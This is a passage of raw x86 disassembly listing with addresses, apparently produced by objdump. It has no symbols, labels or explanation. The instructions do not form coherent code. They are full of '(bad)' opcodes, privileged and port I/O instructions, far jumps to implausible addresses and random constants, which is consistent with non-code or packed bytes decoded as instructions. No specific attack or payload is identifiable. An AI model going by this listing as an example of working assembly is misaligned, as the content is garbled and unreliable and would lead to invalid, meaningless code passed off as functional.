  422f8b:	ror    ch,cl
  422f8d:	or     DWORD PTR [esi*1+0x53e122aa],ecx
  422f94:	xor    eax,esi
  422f96:	out    dx,eax
  422f97:	scas   al,BYTE PTR es:[edi]
  422f98:	imul   ebp,DWORD PTR [ecx+0x55],0x5e7a2fde
  422f9f:	sub    al,0xe7
  422fa1:	xor    al,0xe7
  422fa3:	scas   eax,DWORD PTR es:[edi]
  422fa4:	cmp    BYTE PTR [esi-0x69],dh
  422fa7:	je     0x422f9a
  422fa9:	cmp    ah,BYTE PTR [edi-0x2365c8f6]
  422faf:	enter  0x2b0,0xc7
  422fb3:	mov    bh,0x90
  422fb5:	sbb    ecx,DWORD PTR [ecx+edi*2]
  422fb8:	push   ebp
  422fb9:	aaa    
  422fba:	jmp    0xef1f75b2
  422fbf:	mov    cl,BYTE PTR [edx-0x289f163c]
  422fc5:	mov    al,BYTE PTR [edi+0x29]
  422fc8:	sbb    DWORD PTR [eax+edx*2-0x37],0xaa201e58
  422fd0:	data16 sbb BYTE PTR [esi],cl
  422fd3:	xchg   edx,eax
  422fd4:	hlt    
  422fd5:	pop    edi
  422fd6:	sbb    dh,BYTE PTR [edx+0x1a]
  422fd9:	mov    ecx,0x89fbc30b
  422fde:	sar    BYTE PTR [edi+ebx*4+0x120cd16e],0x2c
  422fe6:	xor    DWORD PTR [edx],ebp
  422fe8:	jne    0x422fb5
  422fea:	add    BYTE PTR [edi],ah
  422fec:	ss lahf 
  422fee:	xor    DWORD PTR [edi+0x1536afb9],ebx
  422ff4:	and    eax,0x72d7075b
  422ff9:	xor    ah,0x63
  422ffc:	fld    DWORD PTR [ecx]
  422ffe:	add    bh,ah
  423000:	add    DWORD PTR [eax],eax
  423002:	add    BYTE PTR [ecx+eiz*2],bh
  423005:	and    al,0xa7
  423007:	pop    ss
  423008:	rol    BYTE PTR [ecx],cl
  42300a:	test   BYTE PTR [esi],0xbf
  42300d:	iret   
  42300e:	sbb    eax,0xcabab6a4
  423013:	dec    edi
  423014:	ins    BYTE PTR es:[edi],dx
  423015:	cmp    BYTE PTR [esi+0x11],al
  423018:	fst    st(0)
  42301a:	lock push eax
  42301c:	or     ebx,edx
  42301e:	test   al,0x7d
  423020:	push   es
  423021:	icebp  
  423022:	cmc    
  423023:	jbe    0x422fe6
  423025:	aad    0x39
  423027:	sbb    eax,0x267016bc
  42302c:	dec    edi
  42302d:	ror    ebp,cl
  42302f:	jnp    0x422ffe
  423031:	dec    esi
  423032:	aad    0x9d
  423034:	test   al,0x68
  423036:	push   ecx
  423037:	xor    edx,DWORD PTR [ecx+0x169b33de]
  42303d:	stos   DWORD PTR es:[edi],eax
  42303e:	cld    
  42303f:	sbb    dl,BYTE PTR [esi]
  423041:	xchg   esi,eax
  423042:	or     al,0x4c
  423044:	jne    0x423027
  423046:	(bad)  
  423047:	retf   
  423048:	scas   al,BYTE PTR es:[edi]
  423049:	and    al,0xfd
  42304b:	sbb    ah,BYTE PTR [ecx+0x3dc86cf]
  423051:	stos   BYTE PTR es:[edi],al
  423052:	or     al,0xda
  423054:	pop    esi
  423055:	inc    ebx
  423056:	inc    esp
  423057:	jmp    0x42303f
  423059:	popf   
  42305a:	inc    ecx
  42305b:	sub    ah,bl
  42305d:	inc    edx
  42305e:	mov    eax,ds:0x4cd4692f
  423063:	xlat   BYTE PTR ds:[ebx]
  423064:	xlat   BYTE PTR ds:[ebx]
  423065:	mov    BYTE PTR [esi],dl
  423067:	test   DWORD PTR [esi-0x4485ef40],esi
  42306d:	out    0xe1,al
  42306f:	je     0x4230b3
  423071:	in     al,0x16
  423073:	out    0xe1,al
  423075:	cli    
  423076:	pop    ss
  423077:	iret   
  423078:	mov    dl,0xdb
  42307a:	stos   DWORD PTR es:[edi],eax
  42307b:	stos   DWORD PTR es:[edi],eax
  42307c:	test   BYTE PTR [edx+edx*1+0x335d2a74],ch
  423083:	jne    0x423085
  423085:	inc    ebx
  423086:	pcmpgtw mm4,QWORD PTR [ebx-0x5fbd0976]
  42308d:	mov    BYTE PTR [esi+eax*8+0x6b240084],bl
  423094:	mov    dl,BYTE PTR [edx-0xe]
  423097:	xchg   ebx,eax
  423098:	clc    
  423099:	xor    ebp,DWORD PTR [edi-0x7fc32468]
  42309f:	inc    eax
  4230a0:	stos   DWORD PTR es:[edi],eax
  4230a1:	lods   eax,DWORD PTR ds:[esi]
  4230a2:	lods   eax,DWORD PTR ds:[esi]
  4230a3:	push   esp
  4230a4:	sub    BYTE PTR [ecx+0x1b301cc7],bl
  4230aa:	adc    bl,BYTE PTR [edx]
  4230ac:	mov    al,0x37
  4230ae:	xor    al,0x96
  4230b0:	sysenter 
  4230b2:	or     bh,BYTE PTR [ebp+0x3701e3d3]
  4230b8:	cmp    eax,0x17762f87
  4230bd:	sbb    bh,bh
  4230bf:	fdivr  DWORD PTR [ebx-0x28077e58]
  4230c5:	mov    esi,DWORD PTR [edi+0x52]
  4230c8:	addr16 jg 0x4230b2
  4230cb:	adc    esi,edx
  4230cd:	gs mov edi,0x9dcb075e
  4230d3:	cmp    DWORD PTR es:[edx+0x674dcb08],ecx
  4230da:	push   0x34
  4230dc:	call   0xab2b0907
  4230e1:	aam    0xb1
  4230e3:	sbb    eax,0x6a22e610
  4230e8:	lock xchg ebx,eax
  4230ea:	jge    0x423160
  4230ec:	or     ecx,eax
  4230ee:	pop    esp
  4230ef:	leave  
  4230f0:	sbb    DWORD PTR [edx+0x3],eax
  4230f3:	loopne 0x4230a1
  4230f5:	aaa    
  4230f6:	or     al,BYTE PTR [edx-0x77]
  4230f9:	xchg   esi,eax
  4230fa:	sub    ah,BYTE PTR ds:0xbd07f60a
  423100:	pushf  
  423101:	sbb    al,0x21
  423103:	mov    eax,0x2a6c1d45
  423108:	xor    eax,DWORD PTR ds:0x1af48881
  42310e:	mov    ds:0x4e7ce72e,al
  423113:	xor    ah,BYTE PTR [esi-0x695a2067]
  423119:	ror    BYTE PTR [esi],1
  42311b:	mov    DWORD PTR [edx],eax
  42311d:	adc    cl,BYTE PTR [ebx]
  42311f:	xor    cl,dl
  423121:	in     eax,0xce
  423123:	push   eax
  423124:	aaa    
  423125:	mov    esp,DWORD PTR [ecx-0x39]
  423128:	ins    DWORD PTR es:[edi],dx
  423129:	push   0xc080f6fa
  42312e:	call   FWORD PTR [eax+0x6cd9351c]
  423134:	(bad)  
  423135:	fist   DWORD PTR [ecx+0x506956fd]
  42313b:	test   eax,0xcbf86bb4
  423140:	lock enter 0x13f3,0xb8
  423145:	cmp    DWORD PTR [edx+0x25],0x11fc625b
  42314c:	cmp    BYTE PTR [ecx+0x44],0xb8
  423150:	mov    ecx,0x7e8c4399
  423155:	xchg   ebp,eax
  423156:	inc    edi
  423157:	jns    0x4230ff
  423159:	retf   
  42315a:	mov    ah,0x11
  42315c:	cdq    
  42315d:	(bad)  
  42315e:	mov    edi,0x5215cee7
  423163:	rcr    BYTE PTR [edx],cl
  423165:	push   edx
  423166:	push   ebp
  423167:	scas   eax,DWORD PTR es:[edi]
  423168:	adc    ecx,DWORD PTR [esp+ebx*4+0x280d53bd]
  42316f:	sbb    eax,0xdb62b46a
  423174:	pusha  
  423175:	jp     0x423175
  423177:	loopne 0x42314b
  423179:	xchg   ebp,eax
  42317a:	jecxz  0x4231e2
  42317c:	sahf   
  42317d:	inc    ebp
  42317e:	and    ebx,DWORD PTR [ebx]
  423180:	test   BYTE PTR [edx-0xe],0x5e
  423184:	pop    edx
  423185:	mov    dl,0xac
  423187:	aas    
  423188:	mov    dh,0xab
  42318a:	in     eax,dx
  42318b:	jae    0x42316d
  42318d:	fsubr  st(4),st
  42318f:	ds pop eax
  423191:	push   ecx
  423192:	es stc 
  423194:	jbe    0x4231b2
  423196:	and    al,0x5f
  423198:	arpl   WORD PTR [edx-0x585206b8],bp
  42319e:	loop   0x423129
  4231a0:	shr    DWORD PTR [edx-0x617f3b22],cl
  4231a6:	ins    DWORD PTR es:[edi],dx
  4231a7:	pop    ss
  4231a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231a9:	push   esp
  4231aa:	dec    esp
  4231ab:	das    
  4231ac:	ss mov edx,0x1bcaf5ab
  4231b2:	aas    
  4231b3:	sub    cl,dh
  4231b5:	cmp    eax,0x28916fcb
  4231ba:	inc    edx
  4231bb:	fcmovb st,st(2)
  4231bd:	or     BYTE PTR [ebx-0x2b539801],0x69
  4231c4:	or     eax,0xf54e37f1
  4231c9:	xor    BYTE PTR [edi],0x7a
  4231cc:	pushf  
  4231cd:	sbb    DWORD PTR [ebp+0x67],0xffffffd3
  4231d1:	jp     0x42316d
  4231d3:	(bad)  [ebp-0x3d51481f]
  4231d9:	sbb    esp,DWORD PTR [ebp+0x71b5c2f7]
  4231df:	lock push ss
  4231e1:	xchg   edx,eax
  4231e2:	test   al,0x69
  4231e4:	ins    DWORD PTR es:[edi],dx
  4231e5:	sbb    cl,BYTE PTR [ebx+0x9b4630]
  4231eb:	aaa    
  4231ec:	(bad)  
  4231ed:	out    0xc2,eax
  4231ef:	mul    ebx
  4231f1:	aaa    
  4231f2:	cmc    
  4231f3:	xchg   ecx,eax
  4231f4:	call   0xc649:0x31cfeef4
  4231fb:	dec    edx
  4231fc:	fild   DWORD PTR [ecx]
  4231fe:	add    bh,ah
  423200:	add    DWORD PTR [eax],eax
  423202:	add    BYTE PTR [edx-0x6d],cl
  423205:	cmp    eax,0x13cf7a52
  42320a:	xchg   ebx,eax
  42320b:	inc    esi
  42320c:	dec    ebx
  42320d:	int3   
  42320e:	call   0xec6ee16
  423213:	clc    
  423214:	outs   dx,BYTE PTR ds:[esi]
  423215:	push   ss
  423216:	adc    edx,edx
  423218:	mov    cl,0x6b
  42321a:	out    dx,al
  42321b:	sub    edx,esi
  42321d:	push   edx
  42321e:	add    ebp,DWORD PTR [ebx-0x3804ce8b]
  423224:	sbb    cl,dh
  423226:	add    bl,BYTE PTR ds:0xbf448bbd
  42322c:	in     eax,0xb
  42322e:	mov    ds:0x44130e2f,eax
  423233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423234:	ret    0x834d
  423237:	aad    0x11
  423239:	dec    eax
  42323a:	(bad)  
  42323b:	loopne 0x42329f
  42323d:	push   esi
  42323e:	gs push eax
  423240:	pop    ebx
  423241:	lods   eax,DWORD PTR ds:[esi]
  423242:	push   esp
  423243:	sub    BYTE PTR [esi],al
  423245:	push   ecx
  423246:	rol    DWORD PTR [eax-0x32],0x76
  42324a:	mov    al,ds:0x2f727211
  42324f:	add    dl,bh
  423251:	lea    ebp,[ecx]
  423253:	stos   DWORD PTR es:[edi],eax
  423254:	mov    WORD PTR [ebp+0x36afb210],ds
  42325a:	mov    edi,0x2c4fcf21
  42325f:	enter  0x4cd7,0xe5
  423263:	pop    esp
  423264:	in     al,0x2
  423266:	test   BYTE PTR [ebp-0x4422bd4b],cl
  42326c:	xchg   esp,eax
  42326d:	popf   
  42326e:	sub    al,0x39
  423270:	xor    al,ah
  423272:	cli    
  423273:	stc    
  423274:	fcomp  DWORD PTR [esi]
  423276:	clc    
  423277:	mov    edx,0xd288bbdf
  42327c:	xchg   esp,eax
  42327d:	or     al,0x99
  42327f:	cdq    
  423280:	jl     0x42328b
  423282:	pop    ebx
  423283:	fwait
  423284:	adc    BYTE PTR [edx-0x2e],0xa4
  423288:	inc    edi
  423289:	int    0xca
  42328b:	and    al,BYTE PTR [edi-0x5ee66730]
  423291:	je     0x42323f
  423293:	test   eax,0x8113f2fa
  423298:	mov    eax,ds:0xb7be1aee
  42329d:	popa   
  42329e:	mov    es,WORD PTR [ecx]
  4232a0:	fsubp  st(4),st
  4232a2:	(bad)  
  4232a3:	sbb    al,0x15
  4232a5:	daa    
  4232a6:	mov    al,BYTE PTR [ebx+0x66]
  4232a9:	or     al,0x7b
  4232ab:	dec    eax
  4232ac:	xor    eax,0x1ff1e5d8
  4232b1:	jno    0x4232ac
  4232b3:	je     0x4232fb
  4232b5:	imul   eax,edi,0xffffffe4
  4232b8:	hlt    
  4232b9:	xor    DWORD PTR [edx-0x3d8d84c6],ebx
  4232bf:	dec    ebx
  4232c0:	iret   
  4232c1:	lea    eax,[ecx-0x27557e73]
  4232c7:	jmp    0x4232cd
  4232c9:	bound  esp,QWORD PTR [ebp-0x35]
  4232cc:	dec    ecx
  4232cd:	scas   eax,DWORD PTR es:[edi]
  4232ce:	jnp    0x423271
  4232d0:	(bad)  
  4232d1:	cmp    ch,BYTE PTR [ebx+0x5a]
  4232d4:	or     eax,0x66267f6a
  4232d9:	pop    ds
  4232da:	mov    bl,0x32
  4232dc:	cli    
  4232dd:	aam    0x57
  4232df:	ret    0xfba9
  4232e2:	xor    al,0x42
  4232e4:	adc    DWORD PTR [edi],edi
  4232e6:	pop    ebp
  4232e7:	clc    
  4232e8:	fild   QWORD PTR [edx-0x3a]
  4232eb:	xor    BYTE PTR [edi-0x4ec93c67],cl
  4232f1:	xor    eax,0x3e02cac4
  4232f6:	and    DWORD PTR [ecx-0x759e5d3a],0x8713951
  423300:	outs   dx,DWORD PTR ds:[esi]
  423301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423302:	fisub  DWORD PTR [ecx-0x67fbb328]
  423308:	loope  0x423381
  42330a:	mov    bl,0x91
  42330c:	fwait
  42330d:	(bad)  
  42330e:	mov    eax,0xffe638d8
  423313:	das    
  423314:	pop    esi
  423315:	and    cl,ah
  423317:	sbb    eax,0x3b1cd8ca
  42331c:	inc    ecx
  42331d:	mov    ss,WORD PTR [eax+esi*2-0x22]
  423321:	(bad)  
  423322:	lea    ecx,es:[edx+0x8]
  423326:	mov    bl,0x73
  423328:	loop   0x4232ea
  42332a:	fwait
  42332b:	mov    dl,0x86
  42332d:	adc    esp,ebp
  42332f:	cmp    DWORD PTR [edi-0x23],ebp
  423332:	dec    esp
  423333:	push   edi
  423334:	add    eax,ebx
  423336:	push   esi
  423337:	sub    al,0x62
  423339:	and    ebx,DWORD PTR [edi+0x64]
  42333c:	or     BYTE PTR [edi-0x637dfbe7],0x53
  423343:	js     0x4232d4
  423345:	jmp    0x423370
  423347:	sbb    BYTE PTR [ebx-0x49c85241],0x52
  42334e:	cwde   
  42334f:	add    DWORD PTR [edx+0x4918261c],edi
  423355:	jne    0x4232de
  423357:	pop    esp
  423358:	push   eax
  423359:	movaps XMMWORD PTR [esi+0x2760632b],xmm3
  423360:	and    al,0xf2
  423362:	sbb    eax,0xfb29dacc
  423367:	add    dh,BYTE PTR [ebx-0x14]
  42336a:	popf   
  42336b:	pop    esi
  42336c:	les    edi,FWORD PTR [eax-0x590a1584]
  423372:	push   edx
  423373:	fs or  ebp,edx
  423376:	mov    ebp,0x9d615eb2
  42337b:	dec    ebp
  42337c:	jmp    0xef827622
  423381:	retf   
  423382:	test   eax,0xeb2b04c4
  423387:	push   cs
  423388:	and    ebx,DWORD PTR [edi+0x0]
  42338b:	jnp    0x4233b7
  42338d:	loope  0x4233bd
  42338f:	adc    cl,BYTE PTR [edx-0x2cc27db2]
  423395:	jne    0x423349
  423397:	pop    eax
  423398:	jbe    0x423340
  42339a:	pop    ecx
  42339b:	mov    esp,0x2d544be8
  4233a0:	in     al,dx
  4233a1:	add    al,0x35
  4233a3:	cmp    eax,0xbea389e3
  4233a8:	mov    cl,ch
  4233aa:	dec    ecx
  4233ab:	mov    ds:0xa50b6d79,al
  4233b0:	dec    ebx
  4233b1:	imul   ebx,DWORD PTR [eax+ebp*1+0x43e188d2],0x127be92c
  4233bc:	xor    al,0xa2
  4233be:	ss (bad) 
  4233c0:	in     al,0xd7
  4233c2:	push   0x1251e9b1
  4233c7:	test   ah,cl
  4233c9:	xor    DWORD PTR [edi-0x223debd],esi
  4233cf:	maxps  xmm2,XMMWORD PTR [edi+0x3224a0c4]
  4233d6:	cli    
  4233d7:	cwde   
  4233d8:	add    edx,esi
  4233da:	push   0xffffff8c
  4233dc:	(bad)  
  4233dd:	bnd jns 0x423372
  4233e0:	aam    0xb8
  4233e2:	push   ebx
  4233e3:	add    BYTE PTR [esp+edi*1+0x1df03421],ah
  4233ea:	add    BYTE PTR [esi],dl
  4233ec:	aad    0xdf
  4233ee:	out    dx,eax
  4233ef:	fucomip st,st(7)
  4233f1:	ss std 
  4233f3:	cmp    BYTE PTR [esi-0x517a0c6],al
  4233f9:	lea    esi,ds:0x1dd31
  4233ff:	out    0x1,eax
  423401:	add    BYTE PTR [eax],al
  423403:	mov    ch,0x62
  423405:	push   es
  423406:	jmp    0xa12f:0x794d1433
  42340d:	pop    esp
  42340e:	sbb    dh,BYTE PTR [edx+0x4d1677d2]
  423414:	ja     0x423409
  423416:	or     DWORD PTR [ecx+0x7a0f138e],esi
  42341c:	(bad)  
  42341d:	push   esp
  42341e:	inc    ecx
  42341f:	xor    ecx,DWORD PTR [eax-0x74]
  423422:	mov    edx,0xa3e69b3c
  423427:	mov    edi,0x8f6cd909
  42342c:	aad    0x4e
  42342e:	add    eax,0xe93b7b5d
  423433:	rol    DWORD PTR [edx+0x52],0xfe
  423437:	pop    ds
  423438:	pop    ss
  423439:	repz sbb al,0x4
  42343c:	ficom  DWORD PTR [esp+eiz*4]
  42343f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423440:	setbe  BYTE PTR [ebx-0x4]
  423444:	dec    eax
  423445:	int3   
  423446:	imul   edx,DWORD PTR [eax+0x6],0xffffff82
  42344a:	dec    esi
  42344b:	add    BYTE PTR [edx+0x68],cl
  42344e:	dec    ecx
  42344f:	sahf   
  423450:	mov    WORD PTR [edx+0x5685f099],?
  423456:	les    edx,FWORD PTR [ebx]
  423458:	mov    ah,cl
  42345a:	cmovs  edx,DWORD PTR [ebx]
  42345d:	mov    dh,0x53
  42345f:	add    esi,DWORD PTR [ecx-0x73]
  423462:	(bad)  
  423463:	push   ebp
  423464:	adc    BYTE PTR [edi+ebx*1-0x51e725f9],bh
  42346b:	cmc    
  42346c:	mov    esp,esi
  42346e:	js     0x4234d8
  423470:	push   ss
  423471:	outs   dx,BYTE PTR ds:[esi]
  423472:	leave  
  423473:	stos   DWORD PTR es:[edi],eax
  423474:	out    0x41,al
  423476:	pushf  
  423477:	rcl    DWORD PTR [ebx+0x4f],cl
  42347a:	scas   eax,DWORD PTR es:[edi]
  42347b:	cmp    eax,0x8dac14be
  423480:	popf   
  423481:	or     ecx,ebx
  423483:	psubusb mm1,QWORD PTR [eax-0x80]
  423487:	adc    DWORD PTR [ecx-0x57],esi
  42348a:	loop   0x4234bd
  42348c:	jmp    0x35389dac
  423491:	dec    ebx
  423492:	adc    BYTE PTR [ecx+ebp*1],dl
  423495:	gs fs mov ebx,0x8382212e
  42349c:	aam    0x54
  42349e:	add    al,0xfa
  4234a0:	fnsave [ebp-0x7c]
  4234a3:	int3   
  4234a4:	ins    DWORD PTR es:[edi],dx
  4234a5:	cmc    
  4234a6:	icebp  
  4234a7:	out    0xc7,al
  4234a9:	dec    ecx
  4234aa:	pop    ebx
  4234ab:	mov    al,0xb3
  4234ad:	test   al,0xc5
  4234af:	jae    0x4234c5
  4234b1:	cwde   
  4234b2:	mov    ds:0xcdca8c03,eax
  4234b7:	xchg   esi,eax
  4234b8:	jp     0x42352c
  4234ba:	mov    dl,0x9e
  4234bc:	pop    edx
  4234bd:	stc    
  4234be:	pop    esp
  4234bf:	ret    
  4234c0:	hlt    
  4234c1:	jecxz  0x423528
  4234c3:	imul   edx,ecx,0xefcff42c
  4234c9:	mov    bl,0xc1
  4234cb:	xor    DWORD PTR [ebp+0xf],eax
  4234ce:	imul   ebx,DWORD PTR [ecx-0x20],0xfb2ce45a
  4234d5:	lock adc dh,BYTE PTR [ecx]
  4234d8:	xor    esi,DWORD PTR [ecx-0x702d228a]
  4234de:	mov    dh,0x91
  4234e0:	jne    0x42348e
  4234e2:	hlt    
  4234e3:	jecxz  0x42347c
  4234e5:	push   ebp
  4234e6:	stos   BYTE PTR es:[edi],al
  4234e7:	push   es
  4234e8:	push   cs
  4234e9:	(bad)  
  4234ea:	xlat   BYTE PTR ds:[ebx]
  4234eb:	pop    esi
  4234ec:	jecxz  0x423481
  4234ee:	add    ch,ah
  4234f0:	retf   
  4234f1:	pop    edx
  4234f2:	sub    BYTE PTR [ebp+0x2b4e62cb],dl
  4234f8:	or     ebx,ecx
  4234fa:	ins    BYTE PTR es:[edi],dx
  4234fb:	adc    BYTE PTR [ecx],0x7
  4234fe:	xchg   edx,eax
  4234ff:	jne    0x423546
  423501:	pop    esi
  423502:	or     al,al
  423504:	xchg   ecx,eax
  423505:	nop
  423506:	push   cs
  423507:	sar    BYTE PTR [edx-0x29],cl
  42350a:	xchg   ebp,eax
  42350b:	mov    WORD PTR cs:[edi-0x1a3c82e2],?
  423512:	mov    edi,0xdf145a04
  423517:	add    eax,0x54053938
  42351c:	add    al,0x8d
  42351e:	in     al,dx
  42351f:	xchg   BYTE PTR ss:[ecx+0x66dbbba0],al
  423526:	inc    eax
  423527:	sbb    esi,edx
  423529:	ret    
  42352a:	mov    ebp,0x277500ac
  42352f:	out    dx,al
  423530:	or     BYTE PTR [esi+0x5231d1e0],0x86
  423537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423538:	ficomp WORD PTR [edi-0x7f7dc8de]
  42353e:	sbb    DWORD PTR [edx+0x56],edi
  423541:	jb     0x423538
  423543:	jg     0x423596
  423545:	and    cl,BYTE PTR [esi]
  423547:	jo     0x4234f8
  423549:	mov    bh,0x6e
  42354b:	push   eax
  42354c:	cmp    BYTE PTR [edi],0xc1
  42354f:	pop    esp
  423550:	jmp    0x3a1ba645
  423555:	adc    BYTE PTR [edx+0x53],0xbd
  423559:	mov    edx,0x109f6cb0
  42355e:	adc    al,BYTE PTR [ebx]
  423560:	into   
  423561:	xchg   ebp,eax
  423562:	mov    eax,ds:0x37867075
  423567:	and    eax,0xba420bf8
  42356c:	jne    0x423595
  42356e:	(bad)  
  42356f:	pushf  
  423570:	imul   edi,DWORD PTR [esi-0x1a4c483b],0xffffffe4
  423577:	mov    ds:0xbb1833ac,eax
  42357c:	adc    DWORD PTR [eax-0x57bb712a],esp
  423582:	dec    ebx
  423583:	outs   dx,DWORD PTR ds:[esi]
  423584:	xor    BYTE PTR [edx],cl
  423586:	push   cs
  423587:	pop    es
  423588:	fistp  QWORD PTR [edx+0x5]
  42358b:	mov    BYTE PTR [eax+0x6fe9700c],0x61
  423592:	adc    BYTE PTR ds:0x39f6651a,cl
  423598:	pop    ebp
  423599:	imul   edi,DWORD PTR [eax-0x1d],0x69
  42359d:	loop   0x4235d9
  42359f:	aaa    
  4235a0:	sar    dl,cl
  4235a2:	in     al,0xec
  4235a4:	mov    edi,0x4b762e13
  4235a9:	popf   
  4235aa:	xchg   edx,eax
  4235ab:	div    DWORD PTR [ebx-0x70]
  4235ae:	rol    DWORD PTR [esi+edx*2-0x68bbd295],cl
  4235b5:	(bad)  
  4235b6:	mov    ebp,0x7836fa5a
  4235bb:	jo     0x42356d
  4235bd:	mov    ch,0xd3
  4235bf:	test   DWORD PTR [ebp-0x35c050f1],esp
  4235c5:	add    ch,bh
  4235c7:	test   DWORD PTR [edi-0x41],ecx
  4235ca:	or     BYTE PTR [edx+0x6f],0x6f
  4235ce:	cmp    DWORD PTR [ebx+0x6c],eax
  4235d1:	mov    dl,0x4b
  4235d3:	mov    dh,0xcd
  4235d5:	push   ebx
  4235d6:	or     BYTE PTR ss:[edi-0x3bf23919],al
  4235dd:	push   0x30
  4235df:	dec    eax
  4235e0:	mov    ds:0xd1acab72,al
  4235e5:	dec    edx
  4235e6:	inc    ebx
  4235e7:	mov    eax,ds:0x6e00a136
  4235ec:	jbe    0x4235d2
  4235ee:	retf   0xdafc
  4235f1:	outs   dx,BYTE PTR ds:[esi]
  4235f2:	neg    BYTE PTR [eax]
  4235f4:	xchg   edx,eax
  4235f5:	xchg   DWORD PTR [edi-0x1f9d6b6c],edx
  4235fb:	sbb    bh,bl
  4235fd:	add    DWORD PTR [eax],eax
  4235ff:	out    0x1,eax
  423601:	add    BYTE PTR [eax],al
  423603:	mov    ss,WORD PTR cs:[ebx]
  423606:	mov    al,ds:0xccf49cf2
  42360b:	lahf   
  42360c:	cmp    dl,BYTE PTR [ebx]
  42360e:	sti    
  42360f:	sar    bl,0x8c
  423612:	or     eax,0x5fb7085c
  423617:	sahf   
  423618:	pop    es
  423619:	mov    edx,0xab64c211
  42361e:	push   ebp
  42361f:	cmp    edx,DWORD PTR gs:[edx-0x3]
  423623:	xchg   edx,eax
  423624:	dec    edx
  423625:	ins    DWORD PTR es:[edi],dx
  423626:	test   al,0xdc
  423628:	fisubr WORD PTR [ebx]
  42362a:	pop    ecx
  42362b:	sub    edi,DWORD PTR [edx+0x1a]
  42362e:	jno    0x4235c9
  423630:	mov    al,0xba
  423632:	jp     0x423649
  423634:	dec    edi
  423635:	(bad)  
  423637:	rcr    BYTE PTR [ecx-0x2f],0xa4
  42363b:	jp     0x4235dd
  42363d:	sbb    ah,BYTE PTR [edi+edx*4+0x78b4bc3c]
  423644:	cmp    bh,BYTE PTR [eax]
  423646:	(bad)  
  423647:	das    
  423648:	xor    cl,BYTE PTR [eax-0x4e648df6]
  42364e:	into   
  42364f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423650:	jle    0x423657
  423652:	inc    eax
  423653:	sub    eax,0x96856e7d
  423658:	adc    eax,0xa10b0e58
  42365d:	mov    edx,0xd7c6ebf7
  423662:	sub    bl,bh
  423664:	aad    0x62
  423666:	mov    ebp,0x181b2d47
  42366b:	hlt    
  42366c:	or     BYTE PTR [esi],cl
  42366e:	cmp    DWORD PTR [ecx-0x71],ebp
  423671:	mov    esi,ds
  423673:	jmp    0x1769478c
  423678:	or     eax,0xb6ebce07
  42367d:	or     edx,DWORD PTR [esi+0x6450b5a1]
  423683:	sub    ebx,DWORD PTR es:[esi-0x78e93186]
  42368a:	jle    0x423681
  42368c:	dec    edx
  42368d:	mov    ebp,0x3afaa278
  423692:	cmp    ch,BYTE PTR [edi+0x5d]
  423695:	push   es
  423696:	cld    
  423697:	vshufps ymm3,ymm4,YMMWORD PTR [ebx],0x6e
  42369c:	jno    0x4236fd
  42369e:	xor    edx,DWORD PTR ds:0x982e138
  4236a4:	into   
  4236a5:	cmp    BYTE PTR [edi],al
  4236a7:	sub    eax,0x60fe14b8
  4236ac:	(bad)  
  4236ad:	das    
  4236ae:	mov    edx,0xbb766b3d
  4236b3:	leave  
  4236b4:	inc    edi
  4236b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236b6:	in     al,dx
  4236b7:	sbb    eax,0x301b40e3
  4236bc:	test   BYTE PTR [ebx-0x4addd424],dl
  4236c2:	popf   
  4236c3:	call   0x54c8:0xb3fd37c6
  4236ca:	(bad)
  4236cd:	mov    edi,cr3
  4236d0:	mov    al,ds:0x260c4a68
  4236d5:	fcomp  DWORD PTR [edx-0x4f]
  4236d8:	xlat   BYTE PTR ds:[ebx]
  4236d9:	or     al,0x55
  4236db:	cmp    eax,0xc5f32381
  4236e0:	mov    BYTE PTR [edx-0x43963eb0],0x81
  4236e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236e8:	test   eax,0x42f79bdc
  4236ed:	rcr    BYTE PTR [ecx+0x23e714ca],cl
  4236f3:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4236f5:	mov    ds:0x8757acc9,eax
  4236fa:	out    dx,al
  4236fb:	hlt    
  4236fc:	cmp    al,0x79
  4236fe:	les    edx,FWORD PTR [eax]
  423700:	imul   ebx,DWORD PTR [ecx],0xffffffc3
  423703:	pop    ebp
  423704:	ret    
  423705:	leave  
  423706:	mov    ebx,0xca762559
  42370b:	xor    edx,ecx
  42370d:	mov    esi,DWORD PTR [eiz*1+0x3b5bfac6]
  423714:	(bad)  
  423716:	jae    0x4236b6
  423718:	adc    DWORD PTR [esi-0x22a2c90b],esp
  42371e:	es out 0xe5,eax
  423721:	add    al,0x3
  423723:	xchg   esi,eax
  423724:	ret    
  423725:	pop    ss
  423726:	lock jno 0x42372f
  423729:	pushf  
  42372a:	fild   QWORD PTR [edi]
  42372c:	push   esi
  42372d:	cs cld 
  42372f:	retf   
  423730:	adc    DWORD PTR [ecx-0x2f4429de],edx
  423736:	pop    ebx
  423737:	push   es
  423738:	sub    cl,BYTE PTR [ecx-0x42]
  42373b:	mov    esi,0x744d508f
  423740:	and    DWORD PTR ds:0x1b8c8ac0,edx
  423746:	fistp  WORD PTR [edi]
  423748:	inc    eax
  423749:	(bad)  
  42374a:	jp     0x423711
  42374c:	(bad)  
  42374d:	into   
  42374e:	cld    
  42374f:	rcl    BYTE PTR [eax-0x406665f0],1
  423755:	loop   0x4236ed
  423757:	ja     0x4236f3
  423759:	xor    al,0x29
  42375b:	add    ch,bh
  42375d:	xchg   DWORD PTR [edi],edi
  42375f:	stc    
  423760:	(bad)  
  423761:	sbb    ch,ch
  423763:	inc    edx
  423764:	mov    esp,0x107a3e28
  423769:	in     eax,0x27
  42376b:	aas    
  42376c:	outs   dx,BYTE PTR ds:[esi]
  42376d:	sbb    BYTE PTR [edx+0x55],cl
  423770:	mov    BYTE PTR [edx+edx*8+0x7d852c76],bh
  423777:	bsf    edx,DWORD PTR [esi]
  42377a:	sub    eax,0x30357d82
  42377f:	ret    0x3412
  423782:	add    DWORD PTR ds:[eax],ebx
  423785:	jp     0x4237c0
  423787:	mov    ebp,0x384a8e03
  42378c:	mov    bh,BYTE PTR [ebx]
  42378e:	mov    ds:0xdac9c63e,al
  423793:	ja     0x4237fc
  423795:	fwait
  423796:	add    edx,DWORD PTR [edi+0x2e]
  423799:	fcom   DWORD PTR [ebx-0x5a69f70d]
